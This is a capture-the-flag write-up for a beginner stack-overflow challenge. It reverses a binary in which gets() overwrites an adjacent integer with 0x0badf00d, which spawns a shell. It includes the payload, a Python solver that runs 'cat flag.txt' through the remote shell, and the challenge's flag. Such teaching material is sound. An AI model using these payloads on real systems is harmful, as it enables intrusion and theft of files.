# I ate something bad ...

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Binary Exploitation |
| Difficulty | Baby |
| Points | 100 |
| Author | 櫛風 |
| Connection | `nc chal.thjcc.org 11037` |
| Handout | [`artifacts/chall.zip`](artifacts/chall.zip) |
| Solver | [`solve.py`](solve.py) |
| Flag | `THJCC{m4yb3_1_34t_t0_much}` |

## Overview

The challenge is a compact stack variable overwrite. The program reads a food
name into a local buffer with `gets()`, then checks whether an adjacent integer
contains the magic value `0x0badf00d`. If it does, the binary calls
`system("/bin/sh")` for us.

Because the target integer begins exactly 44 bytes after the input buffer, the
entire exploit is:

```text
44 padding bytes + p32(0x0badf00d)
```

This changes only the intended local variable. There is no need to corrupt the
saved frame pointer, overwrite the return address, leak libc, or construct a
ROP chain.

## 1. Inspecting the Handout

The challenge archive contains four files:

```text
Dockerfile
docker-compose.yml
flag.txt
chal
```

The original archive has SHA-256:

```text
6ad67a01d72cfdfd0a4dcdb27b29d3a6968c8c9b5c2cb25927ea122cd69baa34
```

`file` identifies the executable as a stripped, dynamically linked x86-64 ELF:

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
```

The binary has deliberately weak hardening:

| Mitigation | State |
| --- | --- |
| PIE | Disabled |
| NX | Disabled |
| Stack canary | Disabled |
| RELRO | Disabled |

None of these properties are necessary for the final exploit, however. The
program already contains the privileged branch and never checks the size of
our input.

The imported functions immediately reveal the likely bug and intended target:

```text
puts
setbuf
system
gets
```

The notable strings are equally direct:

```text
what do you want to eat?
Why you eat this food?
/bin/sh
yammy it is not bad food!
```

## 2. Reconstructing `main`

The executable is stripped, but `_start` passes `0x401156` to
`__libc_start_main`, identifying the main function. Its prologue reserves
`0x30` bytes of stack space:

```asm
0x401156  push rbp
0x401157  mov  rbp, rsp
0x40115a  sub  rsp, 0x30
0x40115e  mov  dword [rbp-0x4], 0
```

After disabling buffering for the three standard streams, the function passes
the address at `rbp-0x30` to `gets`:

```asm
0x4011a1  lea  rax, [0x402004]    ; "what do you want to eat?"
0x4011ab  call puts
0x4011b0  lea  rax, [rbp-0x30]
0x4011b4  mov  rdi, rax
0x4011bc  call gets
```

The next instruction compares the integer at `rbp-0x4` with a conspicuous
constant:

```asm
0x4011c1  cmp dword [rbp-0x4], 0x0badf00d
0x4011c8  jne 0x4011ea
```

If the comparison succeeds, execution reaches the shell branch:

```asm
0x4011ca  lea  rax, [0x40201d]    ; "Why you eat this food?"
0x4011d4  call puts
0x4011d9  lea  rax, [0x402034]    ; "/bin/sh"
0x4011e0  mov  rdi, rax
0x4011e3  call system
```

A reasonable C reconstruction is:

```c
int main(void) {
    char food[44];
    uint32_t bad_food = 0;

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts("what do you want to eat?");
    gets(food);

    if (bad_food == 0x0badf00d) {
        puts("Why you eat this food?");
        system("/bin/sh");
    } else {
        puts("yammy it is not bad food!");
    }
}
```

## 3. Identifying the Vulnerability

`gets()` reads until a newline or end-of-file but has no length parameter. It
cannot know the size of the destination and therefore cannot prevent a stack
overflow.

The two relevant local variables are laid out as:

```text
lower addresses

rbp - 0x30  +---------------------------+
            | food[0]                   |
            | ...                       | 44 bytes
rbp - 0x05  | food[43]                  |
rbp - 0x04  +---------------------------+
            | bad_food                  | 4 bytes
rbp         +---------------------------+
            | saved rbp                 |
rbp + 0x08  | saved return address      |

higher addresses
```

The distance from the beginning of `food` to `bad_food` is:

```text
0x30 - 0x04 = 0x2c = 44 bytes
```

Writing 44 padding bytes fills the buffer exactly. The next four bytes replace
only `bad_food`; the saved frame pointer and return address remain untouched.

## 4. Encoding the Magic Value

x86-64 stores integers in little-endian order. The 32-bit value
`0x0badf00d` must therefore appear in memory as:

```text
0d f0 ad 0b
```

Python's `struct.pack` creates the correct representation without manually
reversing the bytes:

```python
payload = b"A" * 44 + struct.pack("<I", 0x0BADF00D)
```

The `<I` format means:

- `<`: little-endian byte order;
- `I`: unsigned 32-bit integer.

After `gets` writes this payload, the comparison succeeds and the program
invokes `system("/bin/sh")`.

## 5. Reading the Flag Through the Shell

The Dockerfile launches the binary through `socat`:

```dockerfile
CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork,keepalive", "EXEC:./chal,stderr"]
```

The child process and the shell inherit the network socket as standard input
and output. Once `/bin/sh` starts, another line sent over the same connection
is interpreted as a shell command:

```sh
cat flag.txt; exit
```

The explicit `exit` closes the shell cleanly, letting the solver read until
end-of-file instead of depending on a long timeout.

## 6. Complete Exploit

The provided solver uses only Python's standard library. The essential part is:

```python
with socket.create_connection((HOST, PORT), timeout=8) as sock:
    prompt = sock.recv(4096)

    payload = b"A" * 44 + struct.pack("<I", 0x0BADF00D)
    sock.sendall(payload + b"\n")
    sock.sendall(b"cat flag.txt; exit\n")
```

It then collects the response and extracts a `THJCC{...}` value with a regular
expression.

Run it with:

```bash
python3 solve.py
```

The destination can be overridden without editing the script:

```bash
HOST=chal.thjcc.org PORT=11037 python3 solve.py
```

A successful execution produces:

```text
Why you eat this food?
THJCC{m4yb3_1_34t_t0_much}
```

## Flag

```text
THJCC{m4yb3_1_34t_t0_much}
```
